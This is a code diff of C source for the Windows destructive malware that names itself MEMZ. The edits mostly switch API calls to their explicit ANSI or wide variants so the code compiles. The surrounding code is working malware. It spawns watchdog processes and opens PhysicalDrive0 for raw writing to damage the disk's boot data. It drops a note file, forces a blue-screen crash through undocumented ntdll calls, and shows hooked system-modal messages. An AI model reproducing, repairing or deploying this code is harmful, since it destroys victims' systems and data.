@@ -20,8 +20,8 @@ void main() {
 		if (!lstrcmpW(argv[1], L"/watchdog")) {
 			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);
 
-			WNDCLASSEX c;
-			c.cbSize = sizeof(WNDCLASSEX);
+			WNDCLASSEXA c;
+			c.cbSize = sizeof(WNDCLASSEXA);
 			c.lpfnWndProc = WindowProc;
 			c.lpszClassName = "hax";
 			c.style = 0;
@@ -34,9 +34,9 @@ void main() {
 			c.lpszMenuName = NULL;
 			c.hIconSm = 0;
 
-			RegisterClassEx(&c);
+			RegisterClassExA(&c);
 
-			HWND hwnd = CreateWindowEx(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
 
 			MSG msg;
 			while (GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -45,16 +45,16 @@ void main() {
 			}
 		}
 	} else {
-		char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 8192);
-		GetModuleFileNameA(NULL, fn, 8192);
+		wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
+		GetModuleFileName(NULL, fn, 8192);
 
 		for (int i = 0; i < 5; i++)
-			ShellExecuteA(NULL, NULL, fn, "/watchdog", NULL, SW_SHOWDEFAULT);
+			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);
 
 		SHELLEXECUTEINFO info;
 		info.cbSize = sizeof(SHELLEXECUTEINFO);
 		info.lpFile = fn;
-		info.lpParameters = "/main";
+		info.lpParameters = L"/main";
 		info.fMask = SEE_MASK_NOCLOSEPROCESS;
 		info.hwnd = NULL;
 		info.lpVerb = NULL;
@@ -69,7 +69,7 @@ void main() {
 		ExitProcess(0);
 	}
 
-	HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
 	if (drive == INVALID_HANDLE_VALUE)
 		ExitProcess(2);
@@ -89,7 +89,7 @@ void main() {
 
 	CloseHandle(drive);
 
-	HANDLE note = CreateFile("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
 	if (note == INVALID_HANDLE_VALUE)
 		ExitProcess(4);
@@ -240,7 +240,7 @@ void killWindowsInstant() {
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
-	HMODULE ntdll = LoadLibrary("ntdll");
+	HMODULE ntdll = LoadLibraryA("ntdll");
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
@@ -268,7 +268,7 @@ void killWindowsInstant() {
 
 DWORD WINAPI ripMessageThread(LPVOID parameter) {
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBox(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
+	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
 	UnhookWindowsHookEx(hook);
 
 	return 0;
